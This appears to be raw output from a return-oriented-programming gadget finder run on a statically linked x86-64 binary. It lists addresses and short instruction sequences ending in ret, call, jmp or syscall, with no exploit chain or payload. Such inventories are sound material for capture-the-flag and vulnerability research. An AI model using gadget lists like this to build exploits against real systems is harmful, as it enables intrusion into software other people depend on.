0x000000000046b8b1 : and al, 0 ; jmp rax
0x000000000046c4da : and al, 0 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x000000000048d388 : and al, 0x10 ; add rsp, 0x28 ; ret
0x0000000000488481 : and al, 0x10 ; call 0x484eb4
0x000000000048ef40 : and al, 0x10 ; call r14
0x000000000044b138 : and al, 0x10 ; call rax
0x000000000048270b : and al, 0x10 ; call rdx
0x000000000041d2ac : and al, 0x10 ; mov qword ptr [rsp + 8], rax ; call rcx
0x0000000000409628 : and al, 0x10 ; mov qword ptr [rsp + 8], rcx ; call 0x406139
0x0000000000472162 : and al, 0x10 ; mov rdi, r12 ; call rbx
0x000000000048ed28 : and al, 0x10 ; or byte ptr [rax - 0x7d], cl ; ret
0x0000000000401235 : and al, 0x18 ; call rax
0x0000000000475820 : and al, 0x18 ; mov eax, 0x101 ; syscall
0x000000000044f0c8 : and al, 0x18 ; mov r9, r13 ; call rbx
0x000000000047207d : and al, 0x18 ; mov rdi, r12 ; call rbx
0x000000000047437f : and al, 0x18 ; mov rdi, rbp ; mov r9, r14 ; call rbx
0x0000000000482706 : and al, 0x18 ; mov rdx, qword ptr [rsp + 0x10] ; call rdx
0x00000000004517a7 : and al, 0x20 ; call r15
0x00000000004539de : and al, 0x20 ; call rax
0x0000000000474040 : and al, 0x20 ; call rbx
0x000000000044a466 : and al, 0x20 ; je 0x44a499 ; mov eax, 0x48 ; syscall
0x0000000000451672 : and al, 0x20 ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x00000000004a7c64 : and al, 0x26 ; outsd dx, dword ptr [rsi] ; ret 0x5ae4
0x00000000004202f3 : and al, 0x28 ; add rsp, 0x18 ; pop rbx ; pop rbp ; jmp rax
0x00000000004517a2 : and al, 0x28 ; mov rdi, qword ptr [rsp + 0x20] ; call r15
0x00000000004231a3 : and al, 0x28 ; mov rdi, rbp ; call rax
0x0000000000452083 : and al, 0x30 ; call r14
0x000000000045225b : and al, 0x30 ; call rbx
0x000000000047422e : and al, 0x30 ; mov rdi, rbp ; call rbx
0x00000000004534da : and al, 0x38 ; add byte ptr [rsp + rsi - 0xa], dh ; ret
0x0000000000452545 : and al, 0x38 ; call r12
0x0000000000452b7d : and al, 0x38 ; call r14
0x0000000000455b41 : and al, 0x38 ; call r15
0x0000000000451d8b : and al, 0x38 ; call rbx
0x0000000000473f18 : and al, 0x38 ; lea rcx, [rax + 1] ; call rbx
0x0000000000451a97 : and al, 0x38 ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x000000000045207e : and al, 0x38 ; mov rdi, qword ptr [rsp + 0x30] ; call r14
0x0000000000452256 : and al, 0x38 ; mov rdi, qword ptr [rsp + 0x30] ; call rbx
0x00000000004673fc : and al, 0x40 ; add byte ptr [rcx + 0xf], al ; xchg eax, esp ; ret
0x0000000000457a5e : and al, 0x40 ; add byte ptr [rdx + rdi*2 - 0xa], dh ; ret
0x000000000045681e : and al, 0x40 ; add byte ptr [rsi + rsi*2 - 0xa], dh ; ret
0x0000000000481cd9 : and al, 0x40 ; add rsp, 0x48 ; jmp qword ptr [rax]
0x0000000000481c67 : and al, 0x40 ; add rsp, 0x58 ; jmp qword ptr [rax]
0x0000000000453fbc : and al, 0x40 ; call r15
0x0000000000456768 : and al, 0x40 ; call rbx
0x00000000004539d9 : and al, 0x40 ; mov rax, qword ptr [rsp + 0x20] ; call rax
0x0000000000452540 : and al, 0x40 ; mov rdi, qword ptr [rsp + 0x38] ; call r12
0x0000000000452b78 : and al, 0x40 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x0000000000455b3c : and al, 0x40 ; mov rdi, qword ptr [rsp + 0x38] ; call r15
0x0000000000451d86 : and al, 0x40 ; mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x0000000000486dc1 : and al, 0x48 ; add eax, dword ptr [rdx + 8] ; call rax
0x0000000000416f38 : and al, 0x48 ; add esp, 0x10 ; pop rbx ; jmp rax
0x000000000048adf8 : and al, 0x48 ; add esp, 0x38 ; pop rbx ; pop r14 ; ret
0x000000000048aafc : and al, 0x48 ; add esp, 0x38 ; ret
0x0000000000413c14 : and al, 0x48 ; mov edi, ebx ; call rax
0x000000000048de2e : and al, 0x48 ; mov edx, dword ptr [rbp] ; call r12
0x0000000000453fb7 : and al, 0x48 ; mov rdi, qword ptr [rsp + 0x40] ; call r15
0x0000000000456763 : and al, 0x48 ; mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x000000000048dddf : and al, 0x4c ; lea esi, [rbx + rcx*8] ; mov rsi, qword ptr [r14] ; call r12
0x0000000000489d47 : and al, 0x4c ; mov edx, ebp ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rcx]
0x0000000000489cf5 : and al, 0x4c ; mov esi, esp ; mov edi, ebp ; call rax
0x0000000000451a6e : and al, 0x50 ; call 0x44dd44
0x0000000000451a6d : and al, 0x50 ; call 0x44dd45
0x0000000000404a31 : and al, 0x60 ; jmp 0x4044ac
0x0000000000420bbb : and al, 0x68 ; call rax
0x00000000004b16bc : and al, 0x79 ; cli ; call qword ptr [rdx]
0x000000000040272c : and al, 0x80 ; add byte ptr [rax], al ; add al, ch ; retf 0xbfd8
0x0000000000463ace : and al, 0x83 ; ret
0x000000000041799b : and al, 0x83 ; retf 0x4c01
0x000000000045811d : and al, 0x88 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x0000000000419aa3 : and al, 0x89 ; adc byte ptr [r11 + 0x5d], r11b ; ret
0x00000000004048cc : and al, 0x8c ; add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret 0x149
0x0000000000451f9e : and al, 0x98 ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret
0x000000000049218b : and al, 0x98 ; add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x11], cl ; call rax
0x00000000004918eb : and al, 0x98 ; add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 1], cl ; call rax
0x0000000000452a2b : and al, 0xa0 ; add byte ptr [rax], al ; add dh, dh ; ret 0x4801
0x0000000000452420 : and al, 0xa8 ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret
0x00000000004581f3 : and al, 0xb0 ; add byte ptr [rax], al ; add byte ptr [rbp + 0x31], al ; leave ; call r15
0x000000000048cf6b : and al, 0xbf ; add dword ptr [rax], eax ; add byte ptr [rax], al ; call rax
0x000000000044a52c : and al, 0xc ; add rsp, 0x10 ; pop rbx ; ret
0x000000000044a4af : and al, 0xc ; jne 0x44a480 ; neg eax ; jmp 0x44a480
0x000000000044a4ae : and al, 0xc ; jne 0x44a481 ; neg eax ; jmp 0x44a481
0x000000000044a3d3 : and al, 0xc ; mov eax, 0x48 ; syscall
0x0000000000416f22 : and al, 0xc ; mov qword ptr [rsp], rdi ; call 0x4131b8
0x0000000000401230 : and al, 0xc ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x0000000000479e10 : and al, 0xc0 ; add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret 0x848b
0x00000000004174fc : and al, 0xd8 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xac20
0x000000000048aef8 : and al, 0xd8 ; ret
0x00000000004637a1 : and al, 0xe8 ; test eax, 0x8900020e ; ret
0x0000000000418b13 : and al, 0xe9 ; ret 0xfffd
0x0000000000452e3e : and al, 0xf6 ; ret
0x000000000041762d : and al, 8 ; add rsp, 0x20 ; pop rbx ; jmp rax
0x000000000040962d : and al, 8 ; call 0x406134
0x000000000040962c : and al, 8 ; call 0x406135
0x000000000041d8c6 : and al, 8 ; call 0x419b64
0x0000000000403e14 : and al, 8 ; call 0x420104
0x000000000040e01f : and al, 8 ; call rax
0x000000000041d2b1 : and al, 8 ; call rcx
0x000000000048ea2c : and al, 8 ; jmp 0x48ea46
0x000000000044b133 : and al, 8 ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x0000000000411b40 : and al, 8 ; mov rdi, r15 ; call rax
0x000000000049522f : and al, al ; cli ; call rax
0x0000000000494534 : and al, al ; stc ; jmp qword ptr [rax]
0x000000000048f5e4 : and al, byte ptr [rax] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x0000000000490243 : and al, byte ptr [rax] ; jne 0x49022d ; pop rbx ; ret
0x000000000048f5d6 : and al, byte ptr [rax] ; test eax, eax ; je 0x48f5e7 ; ret
0x000000000048f6e6 : and al, byte ptr [rax] ; test eax, eax ; je 0x48f6f7 ; ret
0x000000000044164a : and al, byte ptr [rsp - 0xb7f68c] ; ret 0xc148
0x000000000041cb78 : and al, ch ; ret 0xff3c
0x000000000041c278 : and al, ch ; ret 0xff45
0x0000000000494ccc : and al, dh ; stc ; jmp qword ptr [rax + 0x20fff9f1]
0x00000000004b3409 : and bh, ah ; jmp qword ptr [rcx]
0x0000000000494774 : and bh, ah ; stc ; jmp qword ptr [rax]
0x0000000000469641 : and bh, al ; add ch, byte ptr [rip - 0x7d000000] ; ret
0x00000000004539df : and bh, bh ; rol byte ptr [rbx - 0x76befb08], 1 ; ret 0x415f
0x0000000000494cf4 : and bh, bh ; stc ; jmp qword ptr [rax + 0x20fffa00]
0x0000000000494ca0 : and bh, dh ; stc ; jmp qword ptr [rax + 0x20fff9f8]
0x0000000000494688 : and bl, ah ; stc ; inc dword ptr [rax] ; in eax, 0xf9 ; jmp rax
0x000000000046f24b : and bl, ch ; retf 0x9066
0x000000000049477c : and bl, ch ; stc ; call rax
0x0000000000494cd4 : and bl, dh ; stc ; jmp qword ptr [rax + 0x20fff9f4]
0x0000000000411dd9 : and byte ptr [r11 + rcx*4 + 0x75], r9b ; sbb byte ptr [rax - 0x77], cl ; retf
0x0000000000411e09 : and byte ptr [r8 + 1], r9b ; ret
0x000000000041c77f : and byte ptr [r8 - 0x7d], r9b ; retf
0x0000000000411d6e : and byte ptr [r9 - 0x77], r9b ; xor byte ptr [r8 + 1], r9b ; ret 0x8b49
0x000000000042bfc6 : and byte ptr [rax + 0x29], cl ; retf 0x860f
0x0000000000440fea : and byte ptr [rax + 0x3a], al ; xor byte ptr [rax + 0xf], cl ; ret 0xf8c5
0x000000000042c13c : and byte ptr [rax + 1], cl ; clc ; vzeroupper ; ret
0x0000000000411e0a : and byte ptr [rax + 1], cl ; ret
0x0000000000400fd1 : and byte ptr [rax + 1], cl ; ret 0xb70f
0x00000000004664fe : and byte ptr [rax + 9], cl ; ret 0xff83
0x00000000004412b8 : and byte ptr [rax + 9], cl ; retf 0x8948
0x00000000004413dd : and byte ptr [rax + 9], cl ; retf 0xf48
0x000000000047399e : and byte ptr [rax + 9], cl ; retf 0xf4c
0x0000000000451673 : and byte ptr [rax - 0x75], cl ; and al, 0x10 ; call rax
0x0000000000477378 : and byte ptr [rax - 0x75], cl ; sub byte ptr [rax + 0x39], r9b ; ret 0x870f
0x000000000045ae64 : and byte ptr [rax - 0x77], cl ; sti ; test rax, rax ; je 0x45ae78 ; call rax
0x00000000004503b6 : and byte ptr [rax - 0x7d], cl ; ret
0x000000000048d466 : and byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000467f34 : and byte ptr [rax - 0x7d], cl ; ret 0xe920
0x000000000041c780 : and byte ptr [rax - 0x7d], cl ; retf
0x0000000000413732 : and byte ptr [rax - 1], bh ; pop rbx ; ret
0x000000000044ab9c : and byte ptr [rax - 3], dh ; dec dword ptr [rax - 0x77] ; ret
0x000000000049522d : and byte ptr [rax], ah ; and al, al ; cli ; call rax
0x000000000049522b : and byte ptr [rax], ah ; and byte ptr [rax], ah ; and al, al ; cli ; call rax
0x000000000049522e : and byte ptr [rax], ah ; rol byte ptr [rdx + rdi*8 - 1], 0xd0 ; cli ; jmp rax
0x000000000046020b : and byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; retf 0x8948
0x000000000048d439 : and byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000448ada : and byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x0000000000494cb8 : and byte ptr [rax], al ; cli ; jmp qword ptr [rax - 0x1f0005ff]
0x0000000000494c44 : and byte ptr [rax], dl ; cli ; jmp qword ptr [rax + 0x10fffa0f]
0x0000000000430c14 : and byte ptr [rbp + 0x39480028], dl ; retf 0x8949
0x0000000000431075 : and byte ptr [rbp + rcx*4 + 0x1d], cl ; ret
0x00000000004b3e7c : and byte ptr [rbp - 0x39360000], al ; hlt ; jmp qword ptr [rcx]
0x000000000049244c : and byte ptr [rbp - 0x77], cl ; ret
0x0000000000492317 : and byte ptr [rbp - 0x77], cl ; retf 0x8b49
0x00000000004a9a08 : and byte ptr [rbx + 0x3d], bh ; retf
0x00000000004827cb : and byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000468193 : and byte ptr [rbx + rcx*4 + 0x40], cl ; sub cl, ch ; ret 0xffe8
0x0000000000411dda : and byte ptr [rbx + rcx*4 + 0x75], cl ; sbb byte ptr [rax - 0x77], cl ; retf
0x00000000004afc7c : and byte ptr [rbx], al ; add al, dh ; mov ecx, edi ; call qword ptr [rbx]
0x0000000000494c2c : and byte ptr [rbx], cl ; cli ; jmp qword ptr [rax + 0x10fffa0a]
0x0000000000494f60 : and byte ptr [rbx], dh ; cli ; jmp qword ptr [rax + 0x20fffa32]
0x000000000045de30 : and byte ptr [rcx + 0x2b], cl ; push rdi ; sbb byte ptr [rax + 0x39], cl ; ret 0x850f
0x0000000000417a1f : and byte ptr [rcx - 0x2dcea42f], cl ; jmp rax
0x0000000000411d6f : and byte ptr [rcx - 0x77], cl ; xor byte ptr [r8 + 1], r9b ; ret 0x8b49
0x000000000047f654 : and byte ptr [rcx], dh ; fisttp dword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x94 ; ret
0x000000000049431c : and byte ptr [rdi - 7], ch ; call qword ptr [rax]
0x0000000000447a41 : and byte ptr [rdi], cl ; adc dword ptr [rdi + 0x30], edi ; movups xmmword ptr [r11], xmm8 ; ret
0x0000000000494c0c : and byte ptr [rdi], cl ; cli ; jmp qword ptr [rax + 0x20fffa0e]
0x00000000004105bb : and byte ptr [rdi], cl ; test dword ptr [rsi - 0x77000000], esp ; ret 0xe281
0x0000000000445490 : and byte ptr [rdi], cl ; test ecx, ebx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7520
0x0000000000494c24 : and byte ptr [rdx + rdi*8], cl ; jmp qword ptr [rax + 0x20fffa0b]
0x0000000000494f58 : and byte ptr [rdx + rdi*8], dh ; jmp qword ptr [rax + 0x20fffa33]
0x0000000000494cfc : and byte ptr [rdx], al ; cli ; dec dword ptr [rsi + 0x39] ; cli ; call rax
0x00000000004ad635 : and byte ptr [rdx], al ; imul ecx, dword ptr [rsi], 0x18 ; ret
0x00000000004b2ff0 : and byte ptr [rdx], cl ; cld ; jmp qword ptr [rax]
0x0000000000494f68 : and byte ptr [rdx], dh ; cli ; jmp qword ptr [rax + 0x20fffa31]
0x0000000000494f50 : and byte ptr [rip + 0x34a0fffa], dh ; cli ; jmp qword ptr [rax]
0x0000000000494c1c : and byte ptr [rip + 0xca0fffa], cl ; cli ; jmp qword ptr [rax]
0x000000000042cbda : and byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004b20d5 : and byte ptr [rsi + rcx + 0x18], bh ; ret
0x0000000000494c14 : and byte ptr [rsi], cl ; cli ; jmp qword ptr [rax + 0x20fffa0d]
0x0000000000474962 : and ch, 0xf ; je 0x474989 ; add rax, 2 ; ret
0x0000000000448a98 : and ch, 0xf0 ; cmovne rax, rdx ; pop rbx ; ret
0x0000000000424fea : and ch, 2 ; cmovne rax, rdx ; ret
0x00000000004736eb : and ch, al ; fnsave dword ptr [rcx + rbx*8 - 0x3b] ; std ; xlatb ; retf 0xfdc5
0x0000000000494cb0 : and ch, bh ; stc ; jmp qword ptr [rax + 0x20fff9fe]
0x0000000000494cc4 : and ch, ch ; stc ; jmp qword ptr [rax + 0x20fff9ee]
0x000000000047494d : and cl, 0xf ; je 0x474975 ; ret
0x00000000004946a4 : and cl, ah ; stc ; inc dword ptr [rax] ; jrcxz 0x4946ab ; jmp rax
0x0000000000494235 : and cl, bh ; call rax
0x0000000000494ce4 : and cl, bh ; stc ; jmp qword ptr [rax + 0x20fff9fa]
0x000000000041806a : and cl, byte ptr [rax + 0x39] ; retf
0x000000000044d0b1 : and cl, byte ptr [rax + 0x63] ; add al, 0x82 ; add rax, rdx ; jmp rax
0x000000000047f454 : and cl, byte ptr [rax - 0x77] ; ret 0x1f0f
0x0000000000424763 : and cl, byte ptr [rax - 0x7d] ; ret 0x4801
0x000000000042c41d : and cl, byte ptr [rcx - 0x77] ; ret
0x0000000000473d4a : and cl, byte ptr [rdx] ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x0000000000494778 : and cl, ch ; stc ; jmp qword ptr [rax]
0x0000000000494c90 : and cl, dh ; stc ; jmp qword ptr [rax + 0x20fff9f2]
0x000000000044993d : and dh, ah ; mov edi, edx ; mov eax, r8d ; syscall
0x000000000044c929 : and dh, al ; sub byte ptr [rcx], al ; ret
0x0000000000494c88 : and dh, ch ; stc ; jmp qword ptr [rax + 0x20fff9ef]
0x0000000000494cdc : and dh, dh ; stc ; jmp qword ptr [rax + 0x20fff9f7]
0x0000000000469640 : and dil, al ; add ch, byte ptr [rip - 0x7d000000] ; ret
0x0000000000494728 : and dl, ah ; stc ; inc dword ptr [rax] ; in al, 0xf9 ; jmp rax
0x0000000000494538 : and dl, al ; stc ; jmp qword ptr [rax]
0x0000000000494ca8 : and dl, bh ; stc ; jmp qword ptr [rax + 0x20fff9fb]
0x00000000004691b8 : and dword ptr [r8], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x481e
0x00000000004691b9 : and dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x481e
0x00000000004a9782 : and dword ptr [rax], edx ; jmp qword ptr [rdi]
0x0000000000495bac : and dword ptr [rbx - 5], eax ; inc dword ptr [rbx + rax*2 - 5] ; jmp qword ptr [rcx]
0x0000000000495998 : and dword ptr [rbx - 5], eax ; jmp qword ptr [rcx]
0x000000000049599c : and dword ptr [rbx - 5], eax ; jmp rdx
0x0000000000495c1c : and dword ptr [rbx - 5], eax ; jmp rsp
0x0000000000495b5c : and dword ptr [rbx - 5], eax ; push qword ptr [rbx + rax*2] ; sti ; jmp qword ptr [rcx]
0x0000000000495a28 : and dword ptr [rbx - 5], eax ; push qword ptr [rdx + 0x43] ; sti ; jmp qword ptr [rcx]
0x0000000000418227 : and dword ptr [rbx], 0xffffffef ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x000000000041827f : and dword ptr [rbx], 0xffffffef ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004190ae : and dword ptr [rdi], ecx ; mov dh, 0 ; ret
0x0000000000424cc2 : and dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x00000000004a6839 : and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x00000000004a9781 : and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x000000000045b48b : and eax, 0 ; ret
0x00000000004843cc : and eax, 0x28 ; jne 0x484416 ; leave ; ret
0x00000000004004c9 : and eax, 0x2b8bfa ; nop ; ret
0x000000000040ea88 : and eax, 0x30 ; call rax
0x000000000040e9c2 : and eax, 0x30 ; call rdx
0x000000000040eaae : and eax, 0x30 ; mov rdi, qword ptr [rax + 0x20] ; call rdx
0x0000000000448a1d : and eax, 0x3fc00 ; pop rbx ; ret
0x0000000000448a68 : and eax, 0x3fffc00 ; pop rbx ; ret
0x00000000004609da : and eax, 0x48b4800 ; clc ; jmp rax
0x0000000000448b13 : and eax, 0x7ff80000 ; div ecx ; mov eax, eax ; ret
0x0000000000448ab7 : and eax, 0x7ff80000 ; ret
0x000000000045443b : and eax, 0x833fe283 ; retf 0x4180
0x000000000044c767 : and eax, 0xc ; cmp eax, 4 ; je 0x44c778 ; ret
0x000000000045b42c : and eax, 0xf3087400 ; ret
0x000000000048286c : and eax, 2 ; sub eax, 1 ; ret
0x0000000000487908 : and eax, dword ptr [rax] ; add byte ptr [rbp + 2], dh ; pop rbx ; ret
0x00000000004add09 : and eax, dword ptr [rax] ; add byte ptr [rbx + rsi*4 - 0xa], dl ; call qword ptr [rdi]
0x000000000047f475 : and eax, dword ptr [rax] ; add rsp, 8 ; ret
0x0000000000485478 : and eax, dword ptr [rax] ; add word ptr [rdx + rax*2], 1 ; ret
0x000000000047fda2 : and eax, dword ptr [rax] ; jne 0x47fdda ; call qword ptr [rip + 0x23cab4]
0x0000000000487853 : and eax, dword ptr [rax] ; jne 0x487883 ; ret
0x0000000000484eca : and eax, dword ptr [rax] ; mov qword ptr [rax], rdx ; add rsp, 8 ; ret
0x0000000000484aa5 : and eax, dword ptr [rax] ; mov qword ptr [rip + 0x2375ba], rax ; ret
0x000000000047f51f : and eax, dword ptr [rax] ; mov qword ptr [rsi], rax ; ret
0x000000000047f3b9 : and eax, dword ptr [rax] ; ret
0x000000000047bc22 : and eax, dword ptr [rax] ; xor eax, eax ; add rsp, 8 ; ret
0x000000000045322e : and eax, dword ptr [rip + 0x29480000] ; ret 0x349
0x0000000000418228 : and ebp, edi ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x0000000000418280 : and ebp, edi ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000044c702 : and ebx, 0xffffffbb ; cmp r11d, 0xa ; je 0x44c715 ; ret
0x00000000004a7f34 : and ebx, dword ptr [rbx] ; xor dword ptr [rax - 0x7d993651], ebp ; retf 0xe496
0x000000000042e155 : and ecx, 0xff ; sub eax, ecx ; ret
0x000000000042d888 : and ecx, 0xffff ; sub eax, ecx ; ret
0x000000000044be5a : and ecx, dword ptr [rax - 0x77] ; ret 0xabe
0x0000000000412b0c : and edx, 0xfffffffc ; add rdx, rcx ; jmp 0x412b26
0x0000000000412b0b : and rdx, 0xfffffffffffffffc ; add rdx, rcx ; jmp 0x412b27
0x000000000044c928 : and sil, al ; sub byte ptr [rcx], al ; ret
0x00000000004744a7 : bnd je 0x4744b6 ; test edx, edx ; jne 0x4744a8 ; ret
0x000000000042bd8a : bsf eax, eax ; add rax, rdi ; add rax, rcx ; ret
0x000000000042bcb0 : bsf eax, eax ; add rax, rdi ; ret
0x000000000042c1a1 : bsf eax, eax ; add rax, rdi ; vzeroupper ; ret
0x000000000042bcc0 : bsf eax, eax ; lea rax, [rax + rdi + 0x10] ; ret
0x000000000042bcd0 : bsf eax, eax ; lea rax, [rax + rdi + 0x20] ; ret
0x000000000042bca0 : bsf eax, eax ; lea rax, [rax + rdi - 0x10] ; ret
0x000000000042bbff : bsf eax, eax ; lea rax, [rdi + rax + 0x30] ; ret
0x0000000000440c63 : bsf eax, eax ; lea rax, [rdi + rax] ; ret
0x0000000000441286 : bsf eax, edx ; ret
0x0000000000474557 : bsf eax, edx ; shr rax, 2 ; ret
0x00000000004413e2 : bsf edx, edx ; add rax, rdx ; sub rax, rdi ; ret
0x0000000000440d80 : bsf rax, rax ; lea rax, [rdi + rax] ; ret
0x00000000004412d2 : bsf rax, rdx ; ret
0x0000000000474556 : bsf rax, rdx ; shr rax, 2 ; ret
0x0000000000473387 : bsr eax, eax ; add rax, rdi ; ret
0x000000000047360b : bsr eax, esi ; add rax, rdi ; ret
0x0000000000473519 : bsr esi, esi ; lea rax, [rcx + rsi] ; ret
0x0000000000473415 : bsr esi, esi ; lea rax, [rdi + rsi] ; ret
0x0000000000473386 : bsr rax, rax ; add rax, rdi ; ret
0x000000000047360a : bsr rax, rsi ; add rax, rdi ; ret
0x0000000000473518 : bsr rsi, rsi ; lea rax, [rcx + rsi] ; ret
0x0000000000473414 : bsr rsi, rsi ; lea rax, [rdi + rsi] ; ret
0x000000000047dd6b : call 0x110a60bb
0x00000000004b0f58 : call 0x114b0964
0x00000000004b07c8 : call 0x134b018f
0x00000000004ade28 : call 0x174ad4e8
0x0000000000469d16 : call 0x21469d14
0x0000000000469e8c : call 0x21469e8a
0x000000000046a11b : call 0x2146a119
0x000000000046a5e0 : call 0x2146a5de
0x000000000046a79e : call 0x2146a79c
0x000000000046ad6f : call 0x2146ad6d
0x000000000046afa8 : call 0x2146afa6
0x000000000047512c : call 0x30c4de7f
0x000000000047512b : call 0x30c4de80
0x000000000045d624 : call 0x40043e
0x0000000000478b98 : call 0x40048f
0x00000000004741fd : call 0x400492
0x0000000000414249 : call 0x4004aa
0x000000000044934c : call 0x4004ae
0x0000000000468aa2 : call 0x4004af
0x00000000004039d3 : call 0x4004c2
0x0000000000461cb5 : call 0x4004c6
0x00000000004572a9 : call 0x401be8
0x000000000040962f : call 0x406132
0x000000000040e2cb : call 0x40df66
0x0000000000423db3 : call 0x410842
0x0000000000422153 : call 0x410846
0x000000000041600a : call 0x412262
0x0000000000416f28 : call 0x4131b2
0x00000000004138c0 : call 0x4131b6
0x000000000041d8c8 : call 0x419b62
0x0000000000422345 : call 0x41e582
0x0000000000403e16 : call 0x420102
0x0000000000409f2c : call 0x4209c6
0x0000000000483ba8 : call 0x43fe97
0x00000000004007e8 : call 0x448986
0x00000000004006b1 : call 0x448e46
0x0000000000403191 : call 0x44b4b8
0x000000000046fbfc : call 0x44c692
0x00000000004103e8 : call 0x44c6c2
0x000000000041059f : call 0x44c7b2
0x0000000000452329 : call 0x44c7b8
0x0000000000451a70 : call 0x44dd42
0x0000000000450336 : call 0x458fe7
0x000000000044ea9a : call 0x45b532
0x0000000000461502 : call 0x45d7a2
0x000000000041a47b : call 0x468948
0x0000000000488483 : call 0x484eb2
0x0000000000489952 : call 0x488727
0x000000000040f586 : call 0x49037eda
0x0000000000482d24 : call 0x490abf3b
0x00000000004a917a : call 0x4c14bb35
0x0000000000450d87 : call 0x4d0796db
0x00000000004829fc : call 0x4d0abc13
0x000000000043572a : call 0x4fc26728
0x0000000000435729 : call 0x4fc26729
0x000000000043824a : call 0x4fc29248
0x0000000000438249 : call 0x4fc29249
0x00000000004b1a44 : call 0x784b1ab0
0x000000000047b701 : call 0x86c0395
0x000000000046c89d : call 0xa3f4bd9
0x00000000004541ab : call 0xffffffff810fc4d1
0x0000000000454456 : call 0xffffffff810fc77c
0x0000000000448a7a : call 0xffffffff8407138e
0x00000000004a90da : call 0xffffffffab585bd0
0x00000000004a72a3 : call 0xffffffffaf0d1119
0x0000000000464cd9 : call 0xffffffffc27f94e3
0x000000000041e680 : call 0xffffffffc2cb2e99
0x000000000041f7c0 : call 0xffffffffc2cb3fd9
0x000000000042057a : call 0xffffffffc2cb4d93
0x000000000042207d : call 0xffffffffc2cb6896
0x0000000000422582 : call 0xffffffffc2cb6d9b
0x0000000000422abe : call 0xffffffffc2cb72d7
0x000000000047e35a : call 0xffffffffc2d12f64
0x0000000000419b20 : call 0xffffffffc341c525
0x000000000041e500 : call 0xffffffffc37b2d0a
0x000000000041f8c9 : call 0xffffffffc37b40d3
0x000000000046abae : call 0xffffffffc3caabb6
0x0000000000441737 : call 0xffffffffc414a088
0x0000000000441657 : call 0xffffffffc43c9fa8
0x0000000000484484 : call 0xffffffffca94cfd9
0x0000000000488284 : call 0xffffffffca950dd9
0x0000000000461cb7 : call 0xffffffffcc301cb9
0x0000000000484491 : call 0xffffffffce9ccfeb
0x0000000000488291 : call 0xffffffffce9d0deb
0x000000000044bb15 : call 0xffffffffe1441878
0x0000000000465a2c : call 0xfffffffffc114338
0x0000000000468f2a : call qword ptr [r10 + rax*8]
0x0000000000489ba0 : call qword ptr [r14]
0x00000000004019d0 : call qword ptr [r15 + rbx*8]
0x0000000000494c67 : call qword ptr [rax + 0x10fffa0b]
0x0000000000494c5f : call qword ptr [rax + 0x10fffa0c]
0x0000000000494c57 : call qword ptr [rax + 0x10fffa0d]
0x0000000000494c4f : call qword ptr [rax + 0x10fffa0e]
0x0000000000494a43 : call qword ptr [rax + 0x10fffa10]
0x00000000004944fb : call qword ptr [rax + 0x20fff9c4]
0x0000000000494a13 : call qword ptr [rax + 0x20fffa17]
0x0000000000494d33 : call qword ptr [rax + 0x20fffa3a]
0x0000000000494f0b : call qword ptr [rax + 0x20fffa3e]
0x000000000049533b : call qword ptr [rax + 0x20fffaa1]
0x000000000049483b : call qword ptr [rax + 0x26fffa13]
0x000000000040e30e : call qword ptr [rax + 0x458b41]
0x000000000049530b : call qword ptr [rax - 0x1f00055a]
0x00000000004947f7 : call qword ptr [rax - 0x1f000626]
0x00000000004947a3 : call qword ptr [rax - 0x1f00062d]
0x000000000049462b : call qword ptr [rax - 0x1f000652]
0x00000000004945d7 : call qword ptr [rax - 0x1f000659]
0x0000000000494233 : call qword ptr [rax - 0x2f0006e0]
0x0000000000494223 : call qword ptr [rax - 0x2f0006e5]
0x0000000000494213 : call qword ptr [rax - 0x2f0006ea]
0x0000000000494203 : call qword ptr [rax - 0x2f0006ef]
0x00000000004944f7 : call qword ptr [rax - 0x6f00063e]
0x000000000049454f : call qword ptr [rax]
0x000000000040111e : call qword ptr [rbx + 0x10]
0x000000000040eb80 : call qword ptr [rbx]
0x0000000000494393 : call qword ptr [rcx + 0x11fff997]
0x000000000049439b : call qword ptr [rcx + 0x11fff998]
0x00000000004943a3 : call qword ptr [rcx + 0x21fff999]
0x00000000004ab87b : call qword ptr [rcx + 0xa]
0x0000000000489d50 : call qword ptr [rcx]
0x00000000004019d1 : call qword ptr [rdi + rbx*8]
0x000000000049215d : call qword ptr [rdi]
0x00000000004948e7 : call qword ptr [rdx + 0x22fffa15]
0x0000000000494ddf : call qword ptr [rdx + 0x22fffa3c]
